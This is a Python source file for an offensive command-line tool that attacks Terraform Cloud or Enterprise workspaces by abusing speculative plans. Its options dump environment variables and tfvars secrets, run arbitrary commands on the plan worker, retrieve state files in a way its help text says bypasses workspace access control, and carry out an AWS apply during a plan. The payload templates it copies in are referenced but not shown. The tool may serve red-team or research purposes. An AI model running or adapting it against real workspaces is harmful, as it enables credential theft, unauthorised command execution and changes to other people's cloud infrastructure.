import argparse
import os
import sys
import subprocess
import json
from string import Template
import tempfile
import shutil
import glob
import re

VERBOSE=False
SCRIPT_PATH = ""

def get_script_path():
    return os.path.dirname(os.path.realpath(sys.argv[0]))

# Check if the terraform binary is present in the system
def check_terraform_binary():
    try:
        output = subprocess.check_output("terraform --version".split())
        output = output.decode('ascii')
        if VERBOSE:
            print(f"[+] Output: {output}")
        print("[+] Found terraform client, %s" % output.split('\n')[0])
        return True
    except FileNotFoundError as f:
        return False

# Create a temporal folder that will be used by the terraform client.
# It adds to the folder a backend.tf with the TFC/TFE backend properly configured
def setup_temp_folder(hostname, organization, workspace, terraform_folder):
    # Using: https://docs.python.org/3.4/library/string.html#template-strings
    s = Template(open(os.path.join(os.path.dirname(os.path.realpath(__file__)), "templates/backend.tf")).read())
    backend_str = s.substitute(hostname=hostname, organization=organization, workspace=workspace)
    # Temp folder used to execute the terraform commands
    tmp_folder = tempfile.mkdtemp()
    with open(os.path.join(tmp_folder, 'backend.tf'), "w") as backend:
        backend.write(backend_str)
    if terraform_folder != "":
        os.mkdir(os.path.join(tmp_folder, terraform_folder))
    return tmp_folder

# Perform a speculative plan to get all the environment variables configured in the workspace.
# Outputs the values of the secrets as null_resource resources
def get_all_envs(tmp_folder, terraform_folder):
    # Copying template of the attack to temp folder
    src_file = os.path.join(SCRIPT_PATH, "templates/get_all_envs.tf")
    dst_file = os.path.join(tmp_folder, terraform_folder, "get_all_envs.tf")
    shutil.copy(src_file, dst_file)
    
    # Running a speculative plan
    targets = ["null_resource.null_tfvars", "null_resource.null_envvars"]
    results = run_speculative_plan(tmp_folder, targets)
    
    # Parsing and printing out the results
    print("[+] Terraform Variables from terraform.tfvars:")
    for result in re.findall("null_tfvars\" {.*?\n    }", results, re.DOTALL):
        secret = re.search("          \+ (.*)\n        }", result, re.DOTALL).group(1)
        print("\t" + secret)

    print("[+] All environment variables used in the worker:")
    for result in re.findall("null_envvars\" {.*?\n    }", results, re.DOTALL):
        secret = re.search("          \+ (.*)\n        }", result, re.DOTALL).group(1)
        # /proc/self/environ used NULL as a separator and tfc enconded it
        secret = secret.replace("\\x00", "\n")
        print("\t" + secret)

# Perform a speculative plan which executes a command from the TF worker.
def exec_command(tmp_folder, terraform_folder, command):
    # Copying template of the attack to temp folder
    src_file = os.path.join(SCRIPT_PATH, "templates/exec_command.tf")
    dst_file = os.path.join(tmp_folder, terraform_folder, "exec_command.tf")
    shutil.copy(src_file, dst_file)
    
    s = Template(open(dst_file, "r").read())
    template_filled = s.substitute(command=command)
    open(dst_file, "w").write(template_filled)

    # Running a speculative plan
    targets = ["null_resource.null"]
    results = run_speculative_plan(tmp_folder, targets)

    #print(results)    
    # Parsing and printing results from the output of the null resource trigger
    result = re.search("output\" = (.*)       }", results, re.DOTALL).groups(1)[0]
    # The output is a partial json, we replace some characters here but it's not comprensive
    result = result.replace("\\n", "\n")
    print(f"[+] Output of the command: {result}")

# Performs a terraform apply during a speculative plan with some hardcoded resources; creates an s3 bucket
def apply_on_plan(tmp_folder, terraform_folder, aws_access_key_variable, aws_secret_key_variable):
    # We add the "malicious tf file" which will create an AWS S3 bucket
    src_file = os.path.join(SCRIPT_PATH, "templates/s3_bucket.tf")
    dst_file = os.path.join(tmp_folder, terraform_folder, "template_s3_bucket")
    print(f"[+] Copying template file from {src_file} to {dst_file}")
    shutil.copy(src_file, dst_file) 

    # We add the bash script that performs the apply
    # Pretend the malicious script is a .tpl file
    src_file = os.path.join(SCRIPT_PATH, "templates/apply_on_plan.sh")
    dst_file = os.path.join(tmp_folder, terraform_folder, "apply_on_plan.sh")
    print(f"[+] Copying template file from {src_file} to {dst_file}")
    shutil.copy(src_file, dst_file) 

    # Copying the provider and replacing the templated variables
    src_file = os.path.join(SCRIPT_PATH, "templates/provider_template.tf")
    dst_file = os.path.join(tmp_folder, terraform_folder, "provider")
    print(f"[+] Copying template file from {src_file} to {dst_file}")
    shutil.copy(src_file, dst_file) 
    s = Template(open(dst_file, "r").read())
    # The command we will run is a bash script
    template_filled = s.substitute(access_key_variable=aws_access_key_variable, secret_key_variable=aws_secret_key_variable)
    open(dst_file, "w").write(template_filled)

    # Copying template to execute a command
    src_file = os.path.join(SCRIPT_PATH, "templates/exec_command.tf")
    dst_file = os.path.join(tmp_folder, terraform_folder, "exec_command.tf")
    print(f"[+] Copying template file from {src_file} to {dst_file}")
    shutil.copy(src_file, dst_file) 
    s = Template(open(dst_file, "r").read())
    # The command we will run is a bash script
    template_filled = s.substitute(command="bash apply_on_plan.sh")
    open(dst_file, "w").write(template_filled)

    # Running a speculative plan
    targets = ["null_resource.null"]
    results = run_speculative_plan(tmp_folder, targets)

    #print(results)    
    # Parsing and printing results from the output of the null resource trigger
    result = re.search("output\" = (.*)       }", results, re.DOTALL).groups(1)[0]
    # The output is a partial json, we replace some characters here but it's not comprensive
    result = result.replace("\\n", "\n")
    print(f"[+] Output of the command: {result}")

def get_state_file(tmp_folder, terraform_folder, workspace=None):
    # Copying template to execute a command
    src_file = os.path.join(SCRIPT_PATH, "templates/exec_command.tf")
    
    dst_file = os.path.join(tmp_folder, terraform_folder, "exec_command.tf")
    print(f"[+] Copying template file from {src_file} to {dst_file}")
    shutil.copy(src_file, dst_file) 

    s = Template(open(dst_file, "r").read())
    # The command we will run is a bash script
    if workspace != None:
        command = f"bash retrieve_state_file.sh {workspace}"
        template_filled = s.substitute(command=command)
    else:
        template_filled = s.substitute(command="bash retrieve_state_file.sh")
    open(dst_file, "w").write(template_filled)

    # We add the bash script that performs the tf statefile exfil
    src_file = os.path.join(SCRIPT_PATH, "templates/retrieve_state_file.sh")
    dst_file = os.path.join(tmp_folder, terraform_folder, "retrieve_state_file.sh")
    print(f"[+] Copying template file from {src_file} to {dst_file}")
    shutil.copy(src_file, dst_file) 

    # Running a speculative plan
    targets = ["null_resource.null"]
    results = run_speculative_plan(tmp_folder, targets)
  
    # Parsing and printing results from the output of the null resource trigger
    result = re.search("output\" = (.*)       }", results, re.DOTALL).groups(1)[0]
    # The output is a partial json, we replace some characters here but it's not comprensive
    result = result.replace("\\n", "\n")
    print(f"[+] Output of the command: {result}")

# Runs a speculative plan in TFC/TFE and gets the output
# It handles these scenarios:
#  * No valid credentails to run the speculative plan
#  * Issues when using a relative folder
def run_speculative_plan(tmp_folder, targets):
    
    # Targeting around the existing TF state to reduce prerequisite TF resource declaration
    targets_args = ""
    for target in targets:
        targets_args += f"-target={target} "

    command = "terraform init -no-color"
    print(f"[+] Executing: {command}")
    output = subprocess.run(command.split(), cwd=tmp_folder, stdout=subprocess.PIPE).stdout
    output = output.decode('ascii')
    if VERBOSE:
        print(f"[+] Output: {output}")

    # ToDo: Use a logging library for debug messages
    # if debug:
    #     print(f"[+] Output:" {output}")
    if "unauthorized" in output:
        print("[!] You are not authorized. Run `terraform login $HOSTNAME`.")
        exit(-1)
    if not "Terraform has been successfully initialized!" in output:
        print("[!] Error running `terraform init` this is unexpected")
        exit(-1)
    command = f"terraform plan -no-color {targets_args}"
    print(f"[+] Executing: {command}")

    output = subprocess.run(command.split(), cwd=tmp_folder, stdout=subprocess.PIPE).stdout
    output = output.decode('utf-8')
    if VERBOSE:
        print(f"[+] Output: {output}")
    # This happens when the workspace is configured to use a folder relative to the target repository
    # We need to create that folder and move the files there
    if "can't cd to /terraform/" in output:
        target_dir = re.search("can't cd to /terraform/(.*)", output).group(1)
        print(f"[+] Workspace is configured to use a folder relative to the target repository: {target_dir}")
        print("[+] Rerun this command with the --folder option, using the directory like so: ")
        print(f" --folder {target_dir}")
        shutil.rmtree(tmp_folder)
        exit(-1)

        # ToDo: Delete this
        # # Creating folder 
        # target_dir = os.path.join(tmp_folder, target_dir)
        # os.mkdir(target_dir)

        # # Moving all .tf files to that folder
        # for file in glob.glob(tmp_folder + '/*.tf'):
        #     # We need to leave the backend.tf at the root
        #     if "backend.tf" in file:
        #         continue 
        #     shutil.move(file, target_dir)

        # #move all *.tf to target_dir
        # command = f"terraform plan -no-color {targets_args}"
        # print(f"[+] Executing: {command}")
        # output = subprocess.run(command.split(), cwd=tmp_folder, stdout=subprocess.PIPE).stdout
        # output = output.decode('ascii')
        # if VERBOSE:
        #     print(f"[+] Output: {output}")

    return output
    
def parse_args():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument('--hostname', type=str, help="Terraform Cloud or Enterprise URL. eg: https//app.terraform.io", required=True)
    arg_parser.add_argument('--organization', type=str, help="Terraform organization", required=True)
    arg_parser.add_argument('--workspace', type=str, help="Terraform workspace", required=True)
    arg_parser.add_argument('--folder', type=str, help="Folder in the repo that contains the terraform files where you wish the attack to take place", required=False)
    arg_parser.add_argument('--verbose', action='store_true', help="It shows the output of the execution of each command")

    attack = arg_parser.add_mutually_exclusive_group(required=True)
    attack.add_argument('--get_envs', action='store_true', help="This retrieves the environment variables from a TF workspaces")
    attack.add_argument('--get_state_file', action='store_true', help="This retrieves the state file of the current TF workspace through a TF plan; bypasses TF workspace access control")
    attack.add_argument('--get_state_file_from_workspace', type=str, help="This retrieves the state file of a supplied workspace name through a TF plan; bypasses TF workspace access control")
    attack.add_argument('--exec_command', type=str, help="Runs a command on the TF Worker used to run the speculative plan, useful to access TFC infra and Cloud metadata")    
    attack.add_argument('--apply_on_plan', action='store_true', help="Perform a TF Apply through a TF Plan")
    apply_group = attack.add_argument_group()
    apply_group.add_argument('--aws_access_key_variable', type=str, help="Name of env var holding the AWS access key. Use with --apply_on_plan")    
    apply_group.add_argument('--aws_secret_key_variable', type=str, help="Name of env var holding the AWS secret key. Use with --apply_on_plan")
    apply_group.add_argument('--assume_role', action='store_true', help="Use this if TF workers are assuming role of an instance profile.  Use with --apply_on_plan")
    
    return arg_parser.parse_args()

def main():
    args = parse_args()
    global SCRIPT_PATH
    SCRIPT_PATH = get_script_path()

    if args.folder == None:
        args.folder = ""

    if args.verbose:
        global VERBOSE
        VERBOSE = True
    if not check_terraform_binary():
        # ToDo: Ideally we would point out to the user the same version as the used in the workspace. Not sure how to get this.
        print("terraform binary not found in your system. You can download from here: https://www.terraform.io/downloads.html")
        exit(-1)
    # if not args.token:
    #     # ToDo: get token from default config path
    #     args.token = get_atlas_token()    

    # Create a temp folder to use it during the attack
    tmp_folder = setup_temp_folder(args.hostname, args.organization, args.workspace, args.folder)
    print(f"[+] Created temporal folder {tmp_folder}")

    # if not check_token_and_permissions(args.hostname, args.organization, args.workspace):
    #     exit(-1)
    if args.get_envs:
        get_all_envs(tmp_folder, args.folder)
    elif args.exec_command:
        exec_command(tmp_folder, args.folder, args.exec_command)
    elif args.apply_on_plan:
        apply_on_plan(tmp_folder, args.folder, args.aws_access_key_variable, args.aws_secret_key_variable)
    elif args.get_state_file:
        get_state_file(tmp_folder, args.folder)
    elif args.get_state_file_from_workspace:
        get_state_file(tmp_folder, args.folder, args.get_state_file_from_workspace)
  
    # Remove temporal folder
    shutil.rmtree(tmp_folder)

if __name__ == "__main__":
    main()